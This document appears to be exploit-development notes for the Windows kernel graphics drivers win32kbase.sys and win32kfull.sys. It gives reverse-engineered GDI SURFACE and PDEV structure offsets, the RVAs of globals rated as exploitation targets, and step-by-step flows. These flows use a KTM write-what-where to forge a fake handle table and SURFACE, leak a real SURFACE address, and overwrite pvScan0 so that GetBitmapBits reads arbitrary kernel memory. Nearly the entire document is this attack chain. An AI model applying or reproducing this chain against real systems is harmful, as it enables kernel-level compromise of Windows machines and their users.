# GDI SURFACE Pointer Globals Analysis

## Target

Find kernel global variables in win32kbase.sys and win32kfull.sys whose **values** are SURFACE addresses (or pointers to structures containing SURFACE pointers), enabling a KTM write-what-where exploit chain:

1. Overwrite `gpHandleManager` with a controlled address
2. Set up a fake handle table with a fake SURFACE whose `pvScan0` points to a global
3. Call `GetBitmapBits` to read the global and obtain a real SURFACE kernel address
4. Use the write-what-where to overwrite that real SURFACE's `pvScan0` field
5. Call `GetBitmapBits` on the real bitmap to read arbitrary kernel memory

## IDA Instances

| Binary | PID | Port |
|--------|-----|------|
| win32kbase.sys | 15092 | 13345 |
| win32kfull.sys | 5844 | 13344 |
| ntoskrnl.exe | 8428 | (default) |

## Critical Structure Offsets (Reverse-Engineered)

### SURFACE Structure (extends _BASEOBJECT)

```
SURFACE + 0x00 (0):   _BASEOBJECT header (24 bytes)
  +0x00: HGDIOBJ hHmgr         (8 bytes)
  +0x08: ULONG cRefShareLock   (4 bytes + 4 padding)
  +0x10: (8 bytes, BASEOBJECT fields)

SURFACE + 0x18 (24):  _SURFOBJ embedded (80 bytes, ends at +0x68)
  +0x18: DHSURF dhsurf          (8)  - driver private surface handle
  +0x20: HSURF hsurf            (8)  - GDI surface/bitmap handle
  +0x28: DHPDEV dhpdev          (8)  - driver private PDEV
  +0x30: HDEV hdev              (8)  - win32k PDEV pointer
  +0x38: SIZEL sizlBitmap.cx    (4)  - bitmap width
  +0x3C: SIZEL sizlBitmap.cy    (4)  - bitmap height
  +0x40: ULONG cjBits           (4)  - byte count for Get/SetBitmapBits
  +0x44: (4 bytes padding)
  +0x48: PVOID pvBits           (8)  - bitmap bits pointer
  +0x50: PVOID pvScan0          (8)  - **FIRST SCAN LINE POINTER (OVERWRITE TARGET)**
  +0x58: LONG lDelta            (4)  - scan line stride
  +0x5C: ULONG iUniq            (4)  - unique surface ID
  +0x60: ULONG iBitmapFormat    (4)  - format index into galBitsPerPixel[]
  +0x64: USHORT iType           (2)  - surface type (0=normal, 3=made-opaque)
  +0x66: USHORT fjBitmap        (2)  - bitmap flags

SURFACE + 0x68 (104): SURFACE-specific fields
  +0x70: DWORD flags            (4)  - surface flags (0x4000000 = bitmap, 0x80000000 = device)
  +0x80: XEPALOBJ palette      (8)  - color palette
  +0xA0: DC* pdc                (8)  - owning DC (if selected)
  +0xA8: DWORD cSel             (4)  - selection count
  +0xC8: DIB section handle     (8)
  +0x220: saved hdev (544)      (8)  - original PDEV saved by bBmpMakeOpaque/bMakeOpaque
```

### _SURFOBJ Type Definition (from IDA, size = 80 bytes / 0x50)

```
+0x00: DHSURF dhsurf        (8)
+0x08: HSURF hsurf          (8)
+0x10: DHPDEV dhpdev        (8)
+0x18: HDEV hdev            (8)
+0x20: SIZEL sizlBitmap     (8)  - cx(4) + cy(4)
+0x28: ULONG cjBits         (4)
+0x2C: (4 bytes padding)
+0x30: PVOID pvBits         (8)
+0x38: PVOID pvScan0        (8)  **TARGET**
+0x40: LONG lDelta          (4)
+0x44: ULONG iUniq          (4)
+0x48: ULONG iBitmapFormat  (4)
+0x4C: USHORT iType         (2)
+0x4E: USHORT fjBitmap      (2)
```

### PDEV Structure (key offsets)

```
PDEV + 0x00 (0):     PDEV* pNext              - linked list next pointer
PDEV + 0x08 (8):     ULONG cRef               - reference count
PDEV + 0x28 (40):    DWORD flags              - PDEV flags (0x400 = disabled, 0x800000 = hooked)
PDEV + 0x30 (48):    HSEMAPHORE hsemDevLock   - device lock semaphore
PDEV + 0x708 (1800):  DHPDEV dhpdev           - driver private PDEV data
PDEV + 0x710 (1808):  HDEV hdevShadow        - shadow HDEV
PDEV + 0x718 (1824):  DWORD flags2           - secondary flags
PDEV + 0x9F8 (2552): SURFACE* pSurface       - **THE BITMAP SURFACE POINTER**
PDEV + 0xA08 (2568): GRAPHICS_DEVICE* pGraphicsDevice
PDEV + 0xA10 (2576): HDEV hdev               - HDEV handle
PDEV + 0xDC0 (3520): total PDEV size (cloned via memmove in bHookBmpDrv)
```

### GetBitmapBits Read Path

```
NtGdiGetBitmapBits → GreGetBitmapBits:
  1. Lock SURFACE from bitmap handle via SURFREF
  2. Check SURFACE+0x70 (flags) & 0x4000000  (must be a bitmap surface)
  3. Check SURFACE+0x64 (iType) != 3         (must not be "made opaque")
  4. If iType == 3: creates temp DIB, uses EngCopyBits (indirect path)
  5. If iType != 3: calls bDoGetSetBitmapBits directly
     → reads SURFACE+0x50 (pvScan0) as source address
     → reads SURFACE+0x58 (lDelta) as scan stride
     → copies from pvScan0 to user buffer
```

### pvScan0 Overwrite Target

**pvScan0 is at SURFACE + 0x50 (decimal 80)**

Overwriting this 8-byte field with an arbitrary kernel address causes GetBitmapBits to read from that address.

---

## Candidate Globals

### Table 1: Direct SURFACE* Pointers

| # | Name | Binary | RVA | VA (IDA) | Type | Points To | Status |
|---|------|--------|-----|----------|------|-----------|--------|
| 1 | `SURFACE::pdibDefault` | win32kbase | `0x250020` | `0x1C0250020` | `SURFACE*` | Default 1x1 monochrome bitmap SURFACE | **GO** |
| 2 | `gahStockObjects[21]` | win32kbase | `0x2501F0` (+0xA8 for index 21) | `0x1C02501F0` | `HGDIOBJ[]` | Handle array, index 21 = default bitmap HBITMAP | **NO-GO** (handle, not SURFACE ptr) |

### Table 2: PDEV Pointers (PDEV+0x9F8 = SURFACE*)

| # | Name | Binary | RVA | VA (IDA) | Type | Points To | Dereferences | Status |
|---|------|--------|-----|----------|------|-----------|--------------|--------|
| 3 | `gpBmpDev` | win32kfull | `0x33C370` | `0x1C033C370` | `PDEV*` | Bitmap device PDEV (clone of display PDEV) | Read global → PDEV; Read PDEV+0x9F8 → SURFACE* | **GO** |
| 4 | `gpRedirDev` | win32kfull | `0x33C380` | `0x1C033C380` | `PDEV*` | Redirection device PDEV (clone) | Read global → PDEV; Read PDEV+0x9F8 → SURFACE* | **CONDITIONAL GO** (NULL if no redirection) |
| 5 | `gppdevList` | win32kbase | `0x250BB8` | `0x1C0250BB8` | `PDEV*` | Head of PDEV linked list (pNext at PDEV+0) | Read global → PDEV; Read PDEV+0x9F8 → SURFACE* | **GO** |
| 6 | `gaFntPDev` | win32kfull | `0x339370` | `0x1C0339370` | `PDEV*[]` | Array of font PDEVs | Read array[i] → PDEV; Read PDEV+0x9F8 → SURFACE* | **CONDITIONAL GO** |

### Table 3: SURFOBJ* Arrays (SURFOBJ = SURFACE + 0x18)

| # | Name | Binary | RVA | VA (IDA) | Type | Points To | Dereferences | Status |
|---|------|--------|-----|----------|------|-----------|--------------|--------|
| 7 | `apsoNineGrid` | win32kfull | `0x3393A0` | `0x1C03393A0` | `_SURFOBJ*[]` | Array of cached nine-grid SURFOBJ pointers | Read array[i] → SURFOBJ; SURFACE = SURFOBJ - 0x18 | **CONDITIONAL GO** (entries NULL when not in use) |

### Table 4: Non-Candidates

| # | Name | Binary | RVA | Type | Reason | Status |
|---|------|--------|-----|------|--------|--------|
| 8 | `gStockBitmapFree` | win32kbase | `0x24B3D4` | `LONG` | Counter/free-list head, not a pointer | **NO-GO** |
| 9 | `g_hbmDesktopPattern` | win32kbase | `0x254B78` | `HBITMAP` | Handle, not SURFACE ptr | **NO-GO** |
| 10 | `_ulGlobalSurfaceUnique` | win32kbase | `0x25430C` | `ULONG` | Counter for unique surface IDs | **NO-GO** |
| 11 | `tSize@SURFACE` | win32kbase | `0x24E5E0` | `size_t` | Static class field, sizeof(SURFACE) | **NO-GO** |
| 12 | `ppalDefaultSurface8bpp` | win32kbase | `0x250BF0` | `PALETTE*` | Default palette, not SURFACE | **NO-GO** |
| 13 | `gaWin32KFilterBitmap` | win32kbase | `0x24FCC0` | `PVOID[]` | Filter bitmap array, not SURFACE ptrs | **NO-GO** |
| 14 | `gppdevListUMPDInCreate` | win32kbase | `0x250BB0` | `PDEV*` | PDEV being created (transient) | **NO-GO** (transient) |
| 15 | `gpDevicesPerLuid` | win32kbase | `0x250C58` | `PVOID` | Device list per LUID | **NO-GO** |
| 16 | `glpConvertDfbSurfaceToDibNKAPC` | win32kfull | `0x33A168` | `LONG_PTR` | APC for DFB→DIB conversion | **NO-GO** |
| 17 | `gfDwmDeviceBitmapsEnabled` | win32kfull | `0x33A064` | `LONG` | Flag, not a pointer | **NO-GO** |
| 18 | `gOemBitmapSet` | win32kfull | `0x3356C0` | `OEMBITMAPSET` | OEM bitmap set structure | **NO-GO** |
| 19 | `gabminfo` | win32kfull | `0x32A510` | `_BMINFO[]` | BMINFO array for strip operations | **NO-GO** |
| 20 | `gspwndFullScreen` | win32kfull | `0x33B200` | `WND*` | Fullscreen window pointer | **NO-GO** |

### Table 5: ntoskrnl.exe Globals

| # | Name | RVA | Type | Reason | Status |
|---|------|-----|------|--------|--------|
| 21 | `PsWin32CallBack` | `0xC1DFF8` | `PVOID` | Win32k callout function pointer, not SURFACE | **NO-GO** |
| 22 | `VfWin32kDllBase` | `0xD4A0A8` | `PVOID` | Verifier: win32k DLL base address | **NO-GO** (module base, not SURFACE) |
| 23 | `PsWin32CalloutsEstablished` | `0xC544CC` | `ULONG` | Counter | **NO-GO** |

**No ntoskrnl globals contain SURFACE pointers.** ntoskrnl only holds callout function pointers and verifier metadata for win32k. The GDI SURFACE objects live exclusively in win32k session pool.

---

## Detailed Analysis of GO Candidates

### 1. SURFACE::pdibDefault (GO - BEST CANDIDATE)

- **Binary**: win32kbase.sys
- **RVA**: `0x250020`
- **Symbol**: `?pdibDefault@SURFACE@@2PEAV1@EA`
- **Type**: `SURFACE*` (static class member of SURFACE)
- **What it points to**: The default 1x1 monochrome bitmap SURFACE, created during GDI initialization

**Initialization** (from `bInitBMOBJ` at win32kbase `0x1C0299888`):
```c
HSURF h = GreCreateBitmap(1, 1, 1, 1, 0);  // 1x1, 1bpp monochrome
SURFREF ref(h);
SURFACE* surf = ref.pSurface;
HmgSetOwner(surf->hsurf, 0, 5);            // make permanent (PID 0, type 5 = bitmap)
bSetStockObject(h, 21, 0);                  // stock object index 21
surf->hsurf = h | 0x800000;                 // mark as stock
SURFACE::pdibDefault = surf;                // store global pointer
```

**Usage** (from `hbmSelectBitmapInternal` at win32kbase `0x1C00CA320`):
```c
v15 = dc->pSurface;                         // DC's current bitmap SURFACE
if (!v15)
    v15 = SURFACE::pdibDefault;             // fallback to default if none selected
```

**Why GO**:
- Always initialized during GDI startup, persists for entire session
- Direct `SURFACE*` — single 8-byte read gives the kernel address
- The SURFACE is a 1x1 monochrome bitmap with stock object flag (undeletable)
- Bitmap handle is stock object #21, obtainable via `GetStockObject(21)` from user mode
- After reading pdibDefault to get the SURFACE address, overwrite SURFACE+0x50 (pvScan0) with arbitrary kernel address
- Call `NtGdiGetBitmapBits(GetStockObject(21), ...)` to read from that address
- The SURFACE's iType should be 0 (normal), and flags should have 0x4000000 (bitmap), satisfying the GetBitmapBits preconditions

**Read chain**: `Read(win32kbase_base + 0x250020)` → SURFACE* → overwrite SURFACE+0x50 → GetBitmapBits

### 2. gpBmpDev (GO)

- **Binary**: win32kfull.sys
- **RVA**: `0x33C370`
- **Symbol**: `?gpBmpDev@@3PEAVPDEV@@EA`
- **Type**: `PDEV*`
- **What it points to**: The bitmap device PDEV, a clone of the primary display PDEV

**Initialization** (from `bHookBmpDrv` at win32kfull `0x1C029A9FC`):
```c
if (!gpBmpDev) {
    gpBmpDev = PDEV::Allocate(0);           // allocate new PDEV
}
memmove(gpBmpDev, originalPdev, 0xDC0);     // clone 3520 bytes from display PDEV
// ... hook DDI function pointers (TextOut, BitBlt, etc.) ...
```

**Why GO**:
- The bitmap PDEV is a clone of the primary display PDEV, including its SURFACE
- PDEV + 0x9F8 contains the SURFACE* (the bitmap device's rendering surface)
- This is the screen rendering surface — a large bitmap representing the display
- Two reads: Read global → PDEV*; Read PDEV+0x9F8 → SURFACE*
- The SURFACE at PDEV+0x9F8 is the actual screen bitmap, which is a large allocated surface
- gpBmpDev is initialized when `bHookBmpDrv` is first called (during display setup)
- After display initialization, gpBmpDev is non-NULL for the session lifetime

**Read chain**: `Read(win32kfull_base + 0x33C370)` → PDEV*; `Read(PDEV + 0x9F8)` → SURFACE* → overwrite SURFACE+0x50 → GetBitmapBits

**Caveat**: gpBmpDev may be NULL if bHookBmpDrv hasn't been called yet (before first DC creation with bitmap hooking). On a normal desktop session, it should be initialized.

### 3. gppdevList (GO)

- **Binary**: win32kbase.sys
- **RVA**: `0x250BB8`
- **Symbol**: `?gppdevList@@3PEAVPDEV@@EA`
- **Type**: `PDEV*` (head of linked list)
- **What it points to**: First PDEV in the global PDEV linked list

**Usage** (from `DrvGetHDEV` at win32kbase `0x1C0022770`):
```c
v4 = gppdevList;
while (v4) {
    if (v4->pGraphicsDevice == targetDevice) {
        v4->cRef++;
        return v4;
    }
    v4 = *(PDEV**)v4;                       // v4 = v4->pNext (offset 0)
}
```

**Why GO**:
- The PDEV list contains all display PDEVs
- Each PDEV at offset 0x9F8 has its bitmap SURFACE*
- The first PDEV in the list is typically the primary display PDEV
- Three reads: Read global → PDEV*; Read PDEV+0 → verify next (optional); Read PDEV+0x9F8 → SURFACE*
- More robust than gpBmpDev because the PDEV list is always populated when any display is active

**Read chain**: `Read(win32kbase_base + 0x250BB8)` → PDEV*; `Read(PDEV + 0x9F8)` → SURFACE* → overwrite SURFACE+0x50 → GetBitmapBits

### 4. gpRedirDev (CONDITIONAL GO)

- **Binary**: win32kfull.sys
- **RVA**: `0x33C380`
- **Symbol**: `?gpRedirDev@@3PEAVPDEV@@EA`
- **Type**: `PDEV*`
- **What it points to**: The redirection device PDEV (for DWM composition redirection)

**Initialization** (from `bHookRedir` at win32kfull `0x1C00D5C08`):
```c
if (!gpRedirDev) {
    gpRedirDev = PDEV::Allocate(0);
}
memmove(gpRedirDev, originalPdev, 0xDC0);   // clone from display PDEV
// ... hook redirection DDI functions ...
```

**Why CONDITIONAL GO**:
- Same structure as gpBmpDev — a cloned PDEV with a SURFACE at +0x9F8
- Only initialized when `bHookRedir` is called, which requires a DWM composition session with redirection
- May be NULL on non-composited sessions or during early boot
- If non-NULL, it's a valid PDEV with a valid SURFACE

**Read chain**: `Read(win32kfull_base + 0x33C380)` → PDEV* (check non-NULL); `Read(PDEV + 0x9F8)` → SURFACE*

### 5. apsoNineGrid (CONDITIONAL GO)

- **Binary**: win32kfull.sys
- **RVA**: `0x3393A0`
- **Symbol**: `?apsoNineGrid@@3PAPEAU_SURFOBJ@@A`
- **Type**: `_SURFOBJ*[]` (array of SURFOBJ pointers)
- **What it points to**: Cached nine-grid rendering SURFOBJ pointers

**Usage** (from `xxEngNineGrid` at win32kfull `0x1C00C8CF8`):
```c
ExAcquirePushLockExclusive(&nineGridPushLock);
int idx = RtlFindClearBits(&apsoNineGridBitmapHeader, 1, 0);
if (idx != -1 && apsoNineGrid[idx] != 0) {
    // Reuse cached SURFOBJ
    v10 = apsoNineGrid[idx];
} else {
    // Create new DIB, lock surface, cache it
    SURFOBJ* pso = EngLockSurface(hsurf);
    apsoNineGrid[idx] = pso;
}
RtlSetBits(&apsoNineGridBitmapHeader, idx, 1);
// ... use the SURFOBJ for rendering ...
RtlClearBits(&apsoNineGridBitmapHeader, idx, 1);
```

**Why CONDITIONAL GO**:
- Array entries are `_SURFOBJ*` (which is `SURFACE + 0x18`)
- To get the SURFACE*, subtract 0x18 from the SURFOBJ* value
- Entries are only populated during nine-grid rendering operations and are freed after use
- Entries are NULL when not in active use
- Must acquire `nineGridPushLock` (RVA 0x33C020) before reading to avoid race
- The array size is determined by `apsoNineGridBitmapHeader` (RTL_BITMAP at RVA 0x33C030)
- Unreliable for persistent targeting since entries are freed after each nine-grid operation

**Read chain**: `Read(win32kfull_base + 0x3393A0 + idx*8)` → SURFOBJ* (check non-NULL); SURFACE* = SURFOBJ* - 0x18 → overwrite SURFACE+0x50

### 6. gaFntPDev (CONDITIONAL GO)

- **Binary**: win32kfull.sys
- **RVA**: `0x339370`
- **Symbol**: `?gaFntPDev@@3PAPEAVPDEV@@A`
- **Type**: `PDEV*[]` (array of font PDEVs)
- **What it points to**: PDEVs used for font rendering

**Why CONDITIONAL GO**:
- Font PDEVs are clones of display PDEVs used for font rasterization
- Each PDEV at +0x9F8 has a SURFACE* (the font rendering bitmap)
- Array may have NULL entries depending on font usage
- Less reliable than gpBmpDev but entries persist longer than nine-grid

---

## Exploitation Flow (Using pdibDefault)

```
Step 1: Locate win32kbase.sys kernel base
  - Use NtQuerySystemInformation(SystemModuleInformation) to get base addresses
  - Or derive from ntoskrnl!PsLoadedModuleList

Step 2: Read SURFACE::pdibDefault
  - Set up fake handle table with fake SURFACE
  - fake_SURFACE.pvScan0 = win32kbase_base + 0x250020
  - fake_SURFACE.sizlBitmap = {1, 1}
  - fake_SURFACE.lDelta = 1
  - fake_SURFACE.iBitmapFormat = 1 (1bpp)
  - fake_SURFACE.iType = 0
  - Call NtGdiGetBitmapBits(fake_handle, 8, buffer) → reads 8 bytes from pdibDefault global
  - Result: real SURFACE* kernel address

Step 3: Overwrite real SURFACE pvScan0
  - Use KTM write-what-where to write desired read address to (SURFACE* + 0x50)
  - Target: SURFACE* + 0x50 = pvScan0 field

Step 4: Read arbitrary kernel memory
  - Set up fake handle table entry pointing to the REAL SURFACE (from step 2)
  - Or restore original handle table and use stock object 21
  - Call NtGdiGetBitmapBits(stock_bitmap_21, N, buffer)
  - GetBitmapBits reads from the overwritten pvScan0 → arbitrary kernel read

Step 5: Repeat
  - Overwrite pvScan0 with new address for each read
  - The SURFACE persists (stock object, undeletable)
```

## Exploitation Flow (Using gpBmpDev)

```
Step 1: Read gpBmpDev (win32kfull_base + 0x33C370)
  - fake_SURFACE.pvScan0 = win32kfull_base + 0x33C370
  - NtGdiGetBitmapBits → PDEV* address

Step 2: Read PDEV+0x9F8 to get SURFACE*
  - fake_SURFACE.pvScan0 = PDEV* + 0x9F8
  - NtGdiGetBitmapBits → SURFACE* address

Step 3: Overwrite SURFACE+0x50 (pvScan0)
  - KTM write-what-where: write target address to (SURFACE* + 0x50)

Step 4: Read arbitrary kernel memory
  - Need bitmap handle for the PDEV's surface
  - The PDEV's surface bitmap handle is at SURFACE+0x20 (hsurf)
  - Read SURFACE+0x20 first to get the HBITMAP
  - Then call NtGdiGetBitmapBits with that handle
  - Or: set up fake handle table entry pointing directly to the real SURFACE
```

---

## GetBitmapBits Preconditions

For the direct pvScan0 read path (not EngCopyBits):

1. **SURFACE+0x70 (flags) must have 0x4000000 set** — indicates bitmap surface
2. **SURFACE+0x64 (iType) must NOT be 3** — iType 3 means "made opaque" (uses EngCopyBits indirect path)
3. **SURFACE+0x60 (iBitmapFormat)** must be a valid index into `galBitsPerPixel[]`
4. **SURFACE+0x38 (sizlBitmap)** must be non-zero (width * height)
5. **SURFACE+0x58 (lDelta)** must be a valid scan line stride

For a fake SURFACE, set:
```
+0x38: sizlBitmap.cx = 0x1000  (large enough for reads)
+0x3C: sizlBitmap.cy = 1
+0x50: pvScan0 = target_address
+0x58: lDelta = 0x1000  (stride = width for simple case)
+0x60: iBitmapFormat = 3  (BMF_32BPP, galBitsPerPixel[3] = 32)
+0x64: iType = 0  (normal surface)
+0x70: flags = 0x4000000  (bitmap flag)
```

---

## Summary: GO/NO-GO Decision Matrix

| Candidate | Binary | RVA | Reads Needed | Reliability | Priority |
|-----------|--------|-----|-------------|-------------|----------|
| **pdibDefault** | win32kbase | `0x250020` | 1 | **HIGH** — always initialized, never freed | **#1** |
| **gppdevList** | win32kbase | `0x250BB8` | 2 | **HIGH** — always populated with display active | **#2** |
| **gpBmpDev** | win32kfull | `0x33C370` | 2 | **MEDIUM** — NULL before first bHookBmpDrv call | **#3** |
| **gpRedirDev** | win32kfull | `0x33C380` | 2 | **LOW** — NULL without DWM redirection | **#4** |
| **gaFntPDev** | win32kfull | `0x339370` | 2+ | **LOW** — depends on font usage | **#5** |
| **apsoNineGrid** | win32kfull | `0x3393A0` | 1 | **VERY LOW** — entries freed after each use | **#6** |

**Recommended primary target**: `SURFACE::pdibDefault` at win32kbase RVA `0x250020`
- Single read to get SURFACE* address
- Always present, never freed (stock object)
- Bitmap handle known: stock object #21
- iType = 0, flags have 0x4000000 (satisfies GetBitmapBits direct path)
- 1x1 monochrome bitmap — small but sufficient for 8-byte pointer reads

**Recommended fallback**: `gppdevList` at win32kbase RVA `0x250BB8`
- Two reads to get SURFACE* (list head → PDEV+0x9F8)
- Always populated when any display is active
- The PDEV's SURFACE is the screen bitmap — large surface, good for bigger reads
